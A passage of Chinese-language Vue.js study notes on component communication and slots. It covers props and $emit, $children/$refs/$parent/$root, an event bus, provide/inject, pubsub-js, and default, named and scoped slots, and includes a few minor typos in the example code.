      // 到时候我们把id传递到服务器 一般不需要传递名字的
      {id: 'aaa', name: '热门推荐'},
      {id: 'bbb', name: '手机数码'},
      {id: 'ccc', name: '电脑办公'},
      {id: 'ddd', name: '家用加点'},
    ]
  }
}
```

<br>

### 2. 在子组件的模板里进行展示
```html
<template id='cpn'>
  <div>
    <!-- 展示数据 -->
    <button v-for='item of categaries'>{{item.name}}</button>
  </div>
</template>
```

<br>

### 3. 点击 手机数据 请求对应对应数据
通过自定义事件
```js
this.$emit('发射的事件名', 参数)
```

我需要告诉父组件点了谁 父组件 再根据我点击了谁请求对应的数据  

那我就要监听按钮的点击 并且把item传递进子组件中的方法里 这样才能拿到item的id

既然在子组件的模板里 绑定了 点击事件, 那就在子组件内 methods属性中, 做事件的处理函数 我们给按钮绑定了点击事件后 点击按钮, 因为把item传递到子组件里方法里, 所以子组件的内部就知道了 点击了谁

但是不够, 应该是父组件知道了点击了谁 根据点击了谁去请求新的数据这时候我们就要把点击了谁告诉父组件了 怎么传? 通过自定义事件

```html
<div>
  <button v-for='item of categaries' @click='itemClick(item)'>{{item.name}}</button>
</div>
```

```js 
methods: {
  // 参数, 发射事件的名称, 把item作为参数传递过去
  itemClick(item) {
    this.$emit('itemclick', item)
  }
}
```

我们把 itemclick 事件发送出去了, 父组件就要监听这个事件(子组件发射事件, 父组件接收事件) 父组件怎么接收 监听这个事件?

<br>

### 要点:
``$emit()`` 发送的事件名 最好都是小写 或者可以加 - 分割 item-click, 在html部分里 不要使用驼峰标识符 html不认识


### 5. 父组件接收(绑定)子组件发射出来的事件
```html
<div id="app">
  <cpn v-on:itemclick='cpnClick'></cpn>
</div>
```

既然在被管理区域内绑定了cpnClick事件 那么就在父组件的methods属性里进行处理  

cpnClick 在默认事件中 没有传递参数 会默认的把event对象传递过来  

但是在自定义事件中, 因为这个自定义事件 不是浏览器的事件对象 所以默认会传item

<br>

```html
<cpn v-on:itemclick='cpnClick'></cpn>
```

```js 
const app = new Vue({
  el:'#app',
  data: {
    message: ' 一切都会好的',
  },
  components: {
    cpn
  },
  methods: {
    cpnClick(item) {
      console.log(item)
    }
  }
})
```

<br>

### 总结:
上面介绍了两种方式 子组件和父组件之间的通信 相同点: 父组件中都要配置回调用户接收数据

<br><br>

## 案例: 汇率转换? 父子组件通信

### 要点: 
- 子组件中使用父组件的变量数据
- 在子组件的模板中添加input标签 双向绑定子组件中的数据, 达到修改input的值可以影响到子组件中data中的变量, **同时还会修改父组件中的变量**
- 在输入框1中输入数字 输入框2中的数字是输入框1中的100倍, 输入框2中数字是输入框中的1/100

<br>

- 在父组件中的data属性中, 创建子组件需要使用的变量, 并注册子组件
- 在子组件中的props属性里创建变量, 用于接收父组件传递过来的数据
- 在子组件的模板中使用props属性里创建变量
- 在被管理区域内调用``<cpn />`` 并在内部使用v-bind:子组件变量名='父组件data中的数据'
- 基本结构已经搭建好了 接下来实现需求, 在子组件的模板中创建input标签, 双向绑定子组件中的cnum1, cnum2对应的数据

<br>

### 注意: 
props属性中的变量 用在展示的话没问题, 但是用来修改的话请创建data() {}  

复习知识, 如果是子组件创建变量 数据等 要通过data() {}的方式 作用域的关系  

在data函数中创建新的变量 让props的属性中的变量 赋值给data中创建的新的变量

为了解决上面的需求, 我使用了v-model 双向绑定了 子组件中props里对应的变量值

可以实现修改文本框的值从而影响到, 子组件中props里对应的变量值

<br>

**但是报错了 错误提示:**  
如果动态修改子组件props中的变量的话, 请一定通过父组件来修改
因为子组件中props属性是用来接收父组件中的数据的 用来展示可以 但是要是修改的话不行

因为props最终的目的是让父组件给它传数据, props中变量的数据修改的话应该是来自父组件, 父组件传递过来什么值, props中的变量就是什么值

如果修改子组件props中的属性的话, 书写起来会很乱, 而且两个地方(input的双向绑定 和 父组件的修改)同时这么做的话 这个数值有可能是会乱套的

```html
<template id='cpn'>
  <div>
    <h3>{{cnum1}}</h3>
    <input type="text" v-model='cnum1'>

    <h3>{{cnum2}}</h3>
    <input type="text" v-model='cnum2'>
  </div>
</template>
```

<br>

**在子组件中创建data函数, 用来创建新的变量来接收props属性中变量的值**
```js 
const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      // data中可以使用 props 中的变量
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  }
}
```

<br>

**不使用v-model的形式, 我们使用 :value='data函数中的新变量' + @input的方式**  
:value='data函数中的新变量' 的方式 能实现单向操作 修改父组件的变量num1的值 会影响到 界面上的数据

num1 = cnum1 = dnum1 界面上显示的是dnum1

<br>

**通过input的事件, 监听input的情况 实时赋值给 子组件data函数的变量**  

到这里就实现了v-model的功能, 修改文本框内的数据会影响到子组件data函数中的自定义变量dnum, 但是还没有实现, 影响到子组件props属性中用于接收父组件数据的变量
```js 
<input type="text" :value='dnum1' @input='num1Input'>
<input type="text" :value='dnum2' @input='num2Input'>

// 因为没有传递实参 所以默认是传递了event事件对象 应用event.target相当于this

const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  },
  methods: {
    num1Input(event) {
      this.dnum1 = event.target.value
    },
    num2Input(event) {
      this.dnum2 = event.target.value
    }
  }
}
```

<br>

**我们要把从文本框获取的数据, 传回到父组件中 所以应用到了 $emit() 发射事件**  

我们需要把从文本框里获取到的文本实时发射出去, 让父组件来监听获取参数  

父组件需要在被管理区域的cpn标签内部绑定自定义事件 来监听获取子组件传递过来的参数  

我们还要父组件中定义处理方法 把获取到的参数赋值给data中的变量  

但是默认情况下 input里面的值都是string类型 所以会报类型的错误 我们可以做下类型的转换

```js 
<div id="app">
  <cpn :cnum1='num1' :cnum2='num2' @num1inputchange='num1inputchange' @num2inputchange='num2inputchange'></cpn>
</div>

const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  },
  methods: {
    num1Input(event) {
      this.dnum1 = event.target.value;
      // 实时把从文本框里获取到的文本发射出去, 让父组件来监听获取参数
      this.$emit('num1inputchange', this.dnum1);
    },
    num2Input(event) {
      this.dnum2 = event.target.value;
      this.$emit('num2inputchange', this.dnum2);
    }
  }
}

const app = new Vue({
  el:'#app',
  data: {
    num1: 3,
    num2: 1
  },

  components: {
    cpn
  },

  methods: {
    num1change(value) {
      this.num1 = Number(value);
    },
    num1change(value) {

      // 但是默认情况下 input里面的值都是string类型 所以会报类型的错误 我们可以做下类型的转换
      this.num2 = Number(value);
    }
  }
})
```

<br>

**以上就实现了 修改文本框的值 会同时修改子组件中的data函数中的变量 dnum1 -- 然后又通过$emit()发射出去了事件和dnum1的参数, 父组件来创建事件来处理接收子组件发射出来的自定义函数** 

然后子组件拿到了dnum1这个数据, 赋值给父组件中data中的变量num1

<br>

**在文本框1中输入的数值, 在文本框2中呈现的是文本框1的100倍**  

**在文本框2中输入的数值, 在文本框1中呈现的是文本框2的1/100**   

要实现上面的两点, 还是要在子组件的methods方法中继续写逻辑
```js 
const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  },
  methods: {
    num1Input(event) {
      this.dnum1 = event.target.value;
      // 实时把从文本框里获取到的文本发射出去, 让父组件来监听获取参数
      this.$emit('num1inputchange', this.dnum1);

      // 我们把修改过后的数据再次发射出去, 再让父组件来接收, 再重新传递回来
      this.dnum2 = this.dnum1 * 100;
      this.$emit('num1inputchange', this.dnum2);
    },
    num2Input(event) {
      this.dnum2 = event.target.value;
      this.$emit('num2inputchange', this.dnum2);

      // 这个逻辑里dnum2也发生了变化, 我们也给它发射出去 让父组件知道
      this.dnum1 = this.dnum2 / 100;
      this.$emit('num1inputchange', this.dnum1);
    }
  }
}
```

<br><br>

## 父子通信: 父 访问 子 $children  $refs
前面我们了解了父子组件中如果传递数据, 但有些情况是 在父组件里面能拿到子组件的对象然后直接操作子组件里面的一些东西(就不是两者之间传递东西了)

比如我拿到子组件实例后直接调用子组件对象中的方法 或者说子组件里面去拿父组件里面的对象调下父组件里面的方法或属性 通过对象直接访问的

<br>

### **<font color="#C2185B">父组件访问子组件: 使用 $children 或 $refs</font>**  
### **<font color="#C2185B">子组件访问父组件: 使用 $parent</font>**  
```
这么记好不好 访问谁 $后面跟着就是谁 访问父 $parent 访问子 $children
```

<br>

### $children:
``this.$children``是一个**数组类型**, 它包含所有子组件对象(页面中的所有子组件)

<br>

### $children的问题:
通过$children访问子组件时, 是一个数组类型, 访问其中的子组件必须通过索引值

但是当子组件过多, 我们需要拿到其中一个时, 往往不能确定它的索引值, 甚至还可能发生变化 有时候, 我们想明确获取其中一个特定的组件, 这个时候就可以使用 **$refs**

也就是说 父 访问 子 建议使用 **$refs** 拿到子组件实例 通过实例来操作子组件中的属性 和 方法

<br>

### $children的使用方法

**访问方法:**
```js
this.$children[0].showMessage()
```

**访问属性:**
```js
this.$children[0].num
```

<br>

### 案例:
当页面中只有一个组件时, 使用 $children 访问父组件中的方法和属性

<br>

**需求:**  
点击按钮后 使用子组件中的方法输出语句

<br>

在父组件的methods中的btnClick处理函数中 我们可以通过第一种方式 $children 的方式访问子组件 它是一个数组 所有的子组件都装在这个数组里面

<br>

**弊端:**  
页面中不仅是一个子组件可能有很多 不能确定索引 索引还会变
```html 
<div id="app">
  <cpn></cpn>
  <button @click='btnClick'>点击</button>
</div>

<script>
const app = new Vue({
  el:'#app',
  data: {
    message: '一定会好的'
  },

  components: {
    cpn
  },

  methods: {
    btnClick() {
      /*
        console.log(this.$children)   //[VueComponent]
        既然有这个对象 那我们就可以这样
        this.$children[0].showMessage();
        我们还可以通过$children访问子组件中的属性
      */
      let result = this.$children[0].num;
      console.log(result)
    }
  }
})
</script>
```

<br>

### **<font color='#C2185B'>$refs的使用: this.$refs.refname.属性名</font>**
``$refs`` 和 ref 指令通常是一起使用的  

- 首先 我们通过ref标签属性给某一个子组件绑定一个特定的id
- 其次, 通过this.$refs.refname就可以访问到该组件了

<br>

### 使用 $refs.id.属性名的方式 访问子组件中的属性 或 方法
``$refs``默认是一个空的对象($refs是一个对象类型)
```html 
<div id="app">
  <!-- 在组件上添加 ref属性 -->
  <cpn ref='aaa'></cpn>
  <button @click='btnClick'>点击</button>
</div>

<script>
  methods: {
    btnClick() {
      // 默认的$refs是一个空的对象, 它必须和ref配合使用 使用ref在组件上添加类似id的值
      console.log(this.$refs.aaa.num)
    }
  }
})
</script>
```

<br>

### 总结
- 获取所有子组件的时候使用 $children
- 获取某一个组件的时候使用 ref 和 $refs

<br><br>

## 父子通信: 子 访问 父 $parent
我们在实际开发中并不太会使用 $parent 获取数据后使用

因为我们组件型的开发核心是复用性, 也就是说我们开发的一个一个组件可以自由的在任何文件页面内使用, 所以要保持它的独立性, 如果我们使用了$parent的话 组件和组件之间就会相互关联, 不方便复用, 耦合性太高 

```html
<div id="app">
  <cpn></cpn>
</div>

  <template id='cpn'>
  <div>
    <h3>我是子组件</h3>

    <!-- 子组件中的按钮对应的处理函数应该在子组件的methods内 -->
    <button @click='btnClick'>点击</button>
  </div>
</template>

<script>
const cpn = {
  template: '#cpn',
  methods: {
    btnClick() {

      // 在这里我们要访问父组件 通过$parent Vue 因为这个子组件的父组件就是vue实例 如果是父组件(不是根组件)的话会是VueComponent
      console.log(this.$parent)
      console.log(this.$parent.message)
    }
  }
}
</script>
```

<br><br>

## 通信: 访问根组件(Vue实例) $root
``$root``可以访问到Vue实例中的属性和方法
```js
this.$root.message
```

<br>

一般Vue实例里面什么也没有 只有一些重要的东西, 这个属性用的也很少
```js 
const cpn = {
  template: '#cpn',
  methods: {
    btnClick() {
      console.log(this.$root.message)
    }
  }
}

const app = new Vue({
  el:'#app',
  data: {
    message: '一定会好的'
  },
  components: {
    cpn
  }
})
```

<br><br>

# 任意组件间的通信: 全局事件总线

App内部组件们 实现嵌套关系的时候 A组件想收到别人发给它的数据
```
  App
  ---------------
  |             |
  |  A          |
  |     B       |
  |       C     |
  |             |
  ---------------     
                     事件总线
                    --------
                    |   X   |  
                    --------
```

<br>

### 需求:
当两个组件之间想要进行数据的交换的时候 
- A组件:  接收数据
- C组件:  传递数据

<br>

### 事件总线使用方式: 发送数据方
C组件使用 某种方式 将自定义事件 和 数据 发送到 事件总线X中  

<br>

### 事件总线使用方式: 接收数据方
A组件使用 某种方式 绑定事件总线中某个自定义事件(C组件发射的自定义事件)

<br>

### X 应该拥有的特性:
1. 它要保证所有的组件都要看到它
2. 它还需要能用调用 $on / $off / $emit

<br>


### 创建事件总线
在 main.js 文件中 创建 事件总线  

<br>

**要点:**   
因为要让所有的组件都能够看到 所以 我们将事件总线添加到 Vue的原型对象上

<br>

**方式1: 在 BeforeCreate 的时候在Vue的原型对象上添加 this**
在 beforeCreate() 生命周期函数中 定义事件总线

<br>

**理由:**   
因为这个生命周期中 模板还没有解析 数据 和 结构还没挂载到页面上 我们提前准备好 事件总线
```js 
new Vue({
  name: 'App',
  components: {
    MyItem
  },

  beforeCreate() {
    Vue.prototype.$bus = this
  }
})
```

<br>

**方式2: Vue.prototype.$bus = new Vue()**
我们在Vue实例的外侧 在Vue的原型对象上添加事件总线 让它等于 new Vue()
```js 
Vue.prototype.$bus = new Vue()

new Vue({
  el:'#app',
  render: h => h(App)
})
```

<br>

### 数据发送方: 派发事件到 事件总线
### **<font color="#C2185B">this.$bus.$emit('自定义事件', data)</font>**  
数据发送方在对应的处理函数中 在事件总线中创建一个自定义事件 并可以把数据携带过去
```js 
<button @click='sendData'>把name属性交给App组件</button>

methods: {
  sendData() {
    this.$bus.$emit('sendName', this.name)
    // 这里还可以直接把sendData发送过去 看自己的
  }
}
```

<br>

### 数据接收方: 监听 事件总线 上的指定事件
### **<font color="#C2185B">this.$bus.$on('自定义事件', (data) => { })</font>**  
数据接收方在 mounted() 生命周期函数中 找到$bus 并绑定总线中 数据发送方发送的事件

<br>

**注意:**   
周期函数中的回调要写成箭头函数 或者 回调定义在组件的methods中
```js 
mounted() {
  this.$bus.$on('sendName', (data) => {
    this.name = data
    console.log('App组件收到了', data)
  })
}
```

<br>

### 解绑事件总线中的方法
我们是通过this.$bus.$on的方式 监听事件总线上的事件 用于得到其它组件想要发送的数据

但是我们要在 this.$bus.$on 的组件上(数据接收方的组件) 在该组件即将要销毁的时候 beforeDestroy() 解绑事件

```js 
beforeDestroy() {
  this.$bus.$off('sendName')
}
```

<br>

### 总结:
父子之间传递数据 还是props方法比较方便

<br><br>

# 任意组件间的通信: Provide / inject

### 作用: 
用于组件之间 嵌套层次太深的情况下的组件之间的通信

它们都是Vue中的配置项

<br>

### provide: 父组件用来提供数据

**格式:对象写法**  
provide的值定义成一个对象 **用于提供定义死的数据**
```js
provide: {
  key: value
}
```

<br>

**格式:函数写法**  
将provide写成一个函数 函数内部reture一个对象 **用于传递组件实例上的数据**
```js
provide() {
  return {
    todoLength: this.todos.length
  }
},
```

<br>

### inject: 子组件用来接收和使用数据
**使用方式:**  
- 父组件: 在实例中 使用 "provide" 配置项来定义要提供的数据  
- 子组件: 在实例中 使用 "inject" 配置项来接收数据

```js
// 父组件
export default {
  name: "App",
  data() {
    return { }
  },

  // 使用 provide 提供数据
  provide: {
    username: "sam"
  }
}

// 子组件
export default {
  name: "Child",

  // 使用inject接收数据
  inject: ["username"],
}
```

<br>

### 注意:
**1. provide的对象写法不用用于传递实例上定义的属性 会导致报错**  
``Cannot read property 'length' of undefined``

```js
data() {
  return {
    todos: ['Feed a cat', 'Buy tickets']
  }
},
provide: {
  // 我们传递data中的属性是不行的
  todoLength: this.todos.length 
},
```
上述情况要使用provide的函数形式的写法

<br>

**2. provide中定义的数据 我们通过this访问不到**  
```js
// 定义一个方法尝试方式provide中的数据
methods: {
  handleClick() {
    // 未定义
    console.log(this.username)
  }
},

// provide定义的数据
provide: {
  username: "sam"
},

provide() {
  return {
    username: "sam",
    num: this.books.length
  }
}
```

<br>

**3. 使用provide / inject这种方式 传递的数据不是响应式的**  
我们尝试在父组件中修改provide传递过去的值 发现子组件并没有做出响应式
```js
// 父组件
provide() {
  return {
    num: this.books.length
  }
}


methods: {
  handleClick() {
    // 删除数组中的元素后 子组件并没有做出相应
    this.books.pop()
  }
},

```

<br>

### 处理响应式的解决方法:  
在上面的例子中 如果我们更改了 todos 的列表 这个变化并不会反映在 inject 的 todoLength property 中。  

**这是因为默认情况下 provide/inject 绑定并不是响应式的**

<br>

我们可以通过传递一个 ref property 或 reactive 对象给 provide 来改变这种行为。  

在我们的例子中 如果我们想对祖先组件中的更改做出响应 我们需要为 provide 的 todoLength 分配一个组合式 API computed property: 

```js
app.component('todo-list', {
  // ...
  provide() {
    return {
      todoLength: Vue.computed(() => this.todos.length)
    }
  }
})

app.component('todo-list-statistics', {
  inject: ['todoLength'],
  created() {
    console.log(`Injected property: ${this.todoLength.value}`) // > 注入的 property: 5
  }
})
```


<br><br>

# 消息的订阅与发布
适用于任意组件之间的通信

<br>

### 数据的接收方:
订阅消息 + 指定回调 :  如果有人发布了该消息 回调就会被调用

<br>

### 数据的发送方:
发布消息 发布接收方订阅的消息 + 携带数据 :  这边部分消息由于接收方订阅了该消息 指定回调中就能接收到数据

<br>

**注意:**  
1. 需要数据的人订阅消息 提供数据的人发布消息
2. 订阅 和 发布 的消息名必须一致

<br>

### pubsub.js 使用方式:
我们使用这个库来完成 消息的订阅与发布技术 这个库在任何的框架里面都是实现
```js 
publish:    发布
subscribe:  订阅
```

<br>

**安装:**  
在数据接收方 和 数据发送方 中引入 pubsub 引入后它是一个对象 身上有很多的方法
```
npm i pubsub-js
```

<br>

**数据接收方:**  
引入 pubsub & 订阅消息 订阅消息方法是写在 mounted() 中的
```js
pubsub.subscribe('消息名', (消息名, data) => { })
```

<br>

**数据发送方:**  
引入 pubsub & 发布消息
```js
pubsub.publish('消息名', data)
```

```js 
// 数据接收方: 订阅消息
import pubsub from 'pubsub-js'

mounted() {
  // 我记得可以用占位符将第一个形参占住 因为它没用
  this.pubId = pubsub.subscribe('message', (_, data) => {

  })
}


// 数据发送方: 发布消息
import pubsub from 'pubsub-js'

methods: {
  pubsub.publish('message', data)
}
```

<br>

**取消订阅:**
```js
pubsub.unsubscribe(this.pubId)
```

<br>

当数据接收方(订阅消息的组件)要销毁的时候 我们还是要取消订阅    
取消订阅的方式类似定时器 通过接收订阅消息时的id来取消 订阅 类型``const timer = xxx``
```js 
beforeDestroy() {
  pubsub.unsubscribe(this.pubId)
}
```

<br>

**注意:**  
订阅消息的回调要写箭头函数 在vue里面 事件总线 和 消息的订阅与发布 的模型一样 所以在vue里面使用的并不是很多

<br><br>

# 默认插槽
组件的标签体位置插入数据

<br>

### 思考:
如果我们要展现几个列表 那我是不是可以将下面的列表定义成组件 ``<Category>``

一个组件内部应该显示的信息: 
```js 
美食         汽车
1. xxx      1. xxx
2. xxx      2. xxx
3. xxx      3. xxx
```

<br>

创建好展示组件后 我们在父组件里面使用 使用的同时 将父组件中的数据传递给 ``<Category>`` 组件 让它进行展示

<br>

我们将对应的 数组 和 标题 使用props的形式传递过去
```js 
// 父组件
data: {
  foods: ['锅巴', '烧烤', '龙虾']
  games: ['红警', '吃鸡', '拳皇']
  films: ['教父', '赛车', '你好']
}

<Category title='美食' :listData='foods'>
<Category title='游戏' :listData='games'>
<Category title='电影' :listData='films'>

// 这里我们可以直接传递一样的 属性名listData 给子组件 不需要这样 :foods='foods' 
```

<br>

那 ``<Category>`` 组件需要接收
```js 
// 子组件
props: ['listDate', 'title']

// 使用数据 进行遍历
{{title}} 
li v-for='item in listData'
```

<br>

### 问题:
但是现在有一个问题 我们定义了一个组件 ``<Category>`` 然后通过父组件传递的不同的数据 展示不不同的样式 但组件里面都是通过遍历数据展示的结果   

假如有一天 其中的一个组件内部不展示列表了 开始展示图片 剩下的组件展示列表 那怎么办?  

组件内部没办法处理了 列表要是删了 需要展示列表的组件不能起作用了 要是换成图片那该组件都会展示图片了

也可以利用条件渲染 但是这么做的话 子组件里面就要定义好不同的数据结构 比如 v-show=='美食' 怎么怎么样 但是不清晰 不方便

<br>

### 场景:
**当子组件要展示不同的结构的时候 我们可以使用插槽**

<br>

### 为什么使用插槽?
在生活中很多地方都有插槽, 电脑的usb插槽, 插板当中的电源插槽 插槽的目的是让我们原来的设备具备更多的扩展性  

比如电脑的usb我们可以插入u盘, 硬盘, 手机, 音响, 键盘, 鼠标等

<br>

### 组件的插槽
组件的插槽也是为了让我们封装的组件更加具有扩展性 让**使用者可以决定组件内部的一些内容到底展示什么** 不是在组件里面写死, **也就是说内容由外界决定的**

<br>

### 什么又是 具有扩展性
现在的这个组件不具备任何扩展性, 现在就是一个标题和p标签, 假如页面上有三个组件  
- 第一个组件我想要一个 button  
- 第二个组件我想要一个 span  
- 第三个组件我想要一个 i  

```js 
<template id='cpn'>
  <div>
    <h3>我是组件</h3>
    <p>
      我是组件,哈哈哈
    </p>
  </div>
</template>
```

<br>

**怎么办?**  
现在就一个h3 p写死的, 没办法根据自己的要求私人订制, 没有任何的扩展性   
解决办法其实非常简单 我们直接在组件内容定义一个插槽就可以了  

**插槽就相当于一个预留的空间**, 就跟电脑上的usb一样 外设任意, 你想显示什么东西你决定, 在真是开发里面也一样, 很多组件都要封装一个插槽 

<br>

### 如何封装插槽合适呢?
抽取共性, 保留不同  

最好的封装方式就是将共性抽取到组件中, 将不同暴露为插槽 一旦我们预留了插槽, 就可以让使用者根据自己的需求, 决定插槽中插入什么内容 是
- 搜索框?
- 是文字?
- 是菜单?

由调用者自己来决定

<br>

### 插槽的基本使用:
1. 调用组件的人 将要展示的内容 放在组件 **标签体** 位置
```html
<子组件>
  调用者要在组件中展示的内容
</子组件>
```

2. ``<子组件>``组件内部 使用 ``<slot>`` 标签告诉展示内容放在那里

<br>

### 示例:
子组件内部使用 ``<slot>`` 挖一个坑 等着组件的使用者进行填充
```html
<!-- 1. 父组件 -->
<cpn> 
  <!-- 不同内容 -->
  <button>案例</button>
</cpn>

<cpn>
  <!-- 不同内容 -->
  <span>我是span</span>
</cpn>
```

```html
<!-- 子组件 -->
<div>
  <h3>我是子组件</h3>

  <!-- 组件的使用者想展示的内容将会在这里出现 -->
  <slot></slot>
</div>
```

<br>

### 插槽的默认值

**格式:**
```html
<slot>默认值</slot>
```

当调用组件的人 没有传入要在插槽中展示什么的时候 将展示默认值

<br>

**注意: 样式问题**  
插槽的内容 是 父组件中定义的结构 父组件中定义结构 **这个结构的样式** 
- 是在父组件中写?
- 还是在子组件中写? 

<br>

**回答: 在父组件中!!!**  
因为vue会将父组件中的内容解析好后 放入到子组件里 **所以我们要将放入插槽里面的内容的样式在父组件中整理好**

<br><br>

## 具名插槽(具有名字的插槽)
我们可以想一下, 假如我们组件中的插槽过多的时候 我们就需要**给每一个插槽起一个名字** 这样填入的内容就能找到对应的位置

<br>

### 步骤1: 子组件中 给插槽添加名字
给组件内部的插槽起名字 便于内容对准位置
```html
<slot name='demo'>
```

<br>

### 步骤2: 父组件在使用子组件的插槽时, 利用 template标签 包裹插槽内容 并在template标签的标签属性v-slot:指明使用哪个插槽
```html
<子组件> 
  <!-- 因为使用template包裹元素不会产生额外的结构 -->
  <template v-slot:slotName>
    要插入的数据
  </template>


  <!-- 简写:  -->
  <template #slotName>
    要插入的数据
  </template>
</子组件>
```

<br>

### 要点:
插槽``<slot>``最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性   
如果要设置的话 我们都要给``<slot>``包裹一层``<div>``把上述类似的属性放在这层``<div>``里

也就是说插槽``<slot name=''>``里尽量只有name属性, 其它属性来一层包裹``<div>``

```js 
// 错的方式
<slot v-if='isActive' name='icon-img'></slot>     

// 对的方式
<div v-if='isActive'>
  <slot name='icon-img'><slot>                   
</div>
```

<br><br>

## 扩展: 编译作用域
我在vue父组件中和子组件中分别定义 isShow变量, 利用 v-show 来看下当在被管理区域内使用 v-show 的时候查找的是组件的变量还是实例中的变量

```html
<div id="app">
  <!-- 会显示(因为现在在实例的作用域内) -->
  <cpn v-show='isShow'></cpn>
</div>

<!-- 子组件 -->
<template id='cpn'>
  <div>
    <h3>我是子组件</h3>
    <!-- 不会显示(组件的作用域) -->
    <button v-show='isShow'>clickme</button>
  </div>
</template>

<script>
const cpn = {
  template: '#cpn',
  data() {
    return {
      isShow:false
    }
  }
}

const app = new Vue({
  el:'#app',
  data: {
    message: '一定会好的',
    // isShow变量在父组件中
    isShow:true
  },
  components: {
    cpn
  }
})
</>
```

<br>

### 编译作用域
在查找变量的时候 都是看变量是在哪个模板里面的 在父组件中 就会使用父组件中的变量

- 父组件模板的所有变量都会在父级作用域内编译
- 子组件模板的所有变量都会在子级作用域内编译

我们只需要观察这个变量是在哪个组件里面出现的, 变量就使用该组件内的变量

<br><br>

# 作用域插槽
上面我们了解了作用域 **也就是a组件自己的变量只能a组件自己使用 b组件是使用不了的** 

**一般来讲**, 带有插槽的组件都是负责格式 父组件主要负责传递数据 这样同样的格式能生成不同的数据

- 父组件 - 数据
- 插槽子组件 - 格式

<br>

### 注意:
作用域插槽 是 **数据在子组件中**  
**需要子组件向父组件传递数据 父组件决定以什么形式来渲染数据**
```
        ↗   →   ↘
子组件(数据)    父组件
```

<br>

- 插槽子组件 - 提供数据
- 父组件 - 确定格式

<br>

现在需求变了 我希望的是同样的数据 展示不同的格式
```js 
// 父组件
<Son>
  以ul的形式在插槽中展示数据
</Son>

<Son>
  以ol的形式在插槽中展示数据
</Son>

<Son>
  以h4的形式在插槽中展示数据
</Son>



// 子组件
<slot>我是一些默认值<slot>
```

<br>

这时候我们就不能将定义格式的工作放在子组件里面了 **因为放在子组件里面格式都是一样的**  
我们将数据放在子组件里面 让格式化的工作交给调用插槽的人 但是又有新的问题 由于作用域的关系 **父组件不能使用子组件的数据那怎么办? **

<br><br>

## 作用域插槽的使用方式:

### 1. 子组件向父组件 暴露数据
我们 **会通过 slot标签的 v-bind 属性** 来将子组件中的数据 暴露给调用子组件的组件爱你

插槽给我们提供了便捷的方式 将子组件中的数据传递给调用插槽的人 就如同传递props一样 将数据传递给其它组件 将数据传递给了插槽的使用者

```js 
// 子组件
<slot :games='games'>
```

<br>

### 2. 父组件 使用 子组件暴露的数据
父组件在使用子组件中 通过插槽的方式暴露出来的数据时 要做如下的步骤

1. 在调用子组件的时候 在子组件的标签体中使用 template标签
```html
<子组件>
  <template>
    <div>传入插槽中的结构<div>
  </template>
</子组件>
```

2. 在 template标签中 使用 **slot-scope** 标签属性来接收子组件暴露的数据
```html
<子组件>
  <template scope='变量'>
    <div>传入插槽中的结构<div>
  </template>


  <!-- 高版本: slot-scope -->
  <template slot-scope='变量'>
    <div>传入插槽中的结构<div>
  </template>
</子组件>
```

**注意:**  
该 变量 是一个对象 我们传递过来的数据 会做为对象中的一个属性 既然这么就可以利用解构赋值哦

<br>

### 解析父组件接收数据的格式:
```html
<!-- 父组件 -->
<TestChild>
  <template slot-scope="data">
    <div>{{ data.username }}</div>
  </template>
</TestChild>

<TestChild>
  <!-- 解构赋值 -->
  <template slot-scope="{ username }">
    <div>{{ username }}</div>
  </template>
</TestChild>



<!-- 子组件 -->
<slot :username="username" />
```

1. 子组件利用 v-bind 的形式将 username 对应的数据暴露出去
2. 父组件使用 slot-scope 定义 data 来接收子组件暴露出来的数据, 暴露出来的数据会作为data对象中的一个属性
```js
data: {
  username: ""
}
```

<br>

### 各个版本的作用域插槽的使用方式:

**2.5以下的版本, 使用 scopre 标签属性:**
```js 
<Son>
  <template scope="data">
    {{data.msg}}
  </template>
</Son>
```

**2.5以上的版本, 使用 slot-scope 标签属性:**
```js
// 父组件
<Child>
  <template slot-scope="data">
    {{data.msg}}
  </template>
</Child>

// 子组件
<div>
  <slot :msg="msg">我是Top默认插槽</slot>
</div>
```

亲测以上两种在 v2.6 都好用

<br>

### 具名插槽 和 作用域插槽 不能一起使用么? 
可以 但是 父组件要使用这种特定的方式确定指定插槽和绑定数据 
```html
<template v-slot:指明子组件的插槽名="子组件中传递过来的变量对象">

<!-- 简写形式: 从子组件中传递过来的变量对象中解构 -->
<template #指明子组件的插槽名="{ text, emitEvent }">
```

<br>

### 实战: 作用域插槽 + emit事件

1. 子组件使用作用域插槽 向 父组件暴露一个 emit 方法
```js
<slot name="btnArea" :eventHandler="eventHandler"></slot>

methods: {
  eventHandler(eventName, flag) {
    this.$emit(eventName, flag)
  }
}
```

2. 父组件通过 template 解构出来 eventHandler 方法 绑定给插槽部分的btn
3. 插槽部分的btn调用eventHandler方法 **在父组件中指定派发什么事件**
4. 指定派发的事件后 直接在子组件标签中进行绑定``<DialogChildTest @handler="handler">``

```html
<DialogChildTest
  @handler="handler"
  v-model="flag"
>
  <template #btnArea="{ eventHandler }">
    <v-btn
      color="error"
      text
      @click="eventHandler('handler', true)"
    >
      Yes
    </v-btn>
  </template>
</DialogChildTest>
```


<br>

**父组件**
```html
<template>
  <div>
    <h3 class="title">Dialog父组件</h3>
    <hr>
    <DialogChildTest
      @handler="handler"
      v-model="flag"
    >
      <template #btnArea="{ eventHandler }">
        <v-btn
          color="error"
          text
          @click="eventHandler('handler', true)"
        >
          Yes
        </v-btn>
      </template>
    </DialogChildTest>
  </div>
</template>

<script>
import DialogChildTest from '../components/DialogChildTest.vue'
export default {
  name: "DialogTest",
  components: { DialogChildTest },
  data() {
    return {
      flag: false
    }
  },
  methods: {
    handler(flag) {
      if(flag) {
        this.flag = false
      }
    }
  }
}
</script>
```

<br>

**子组件**
```html
<template>
  <div class="text-center">
    <v-dialog
      v-model="value"
      width="500"
    >
      <v-card>
        <v-card-actions>
          <v-spacer></v-spacer>
          <slot name="btnArea" :eventHandler="eventHandler"></slot>
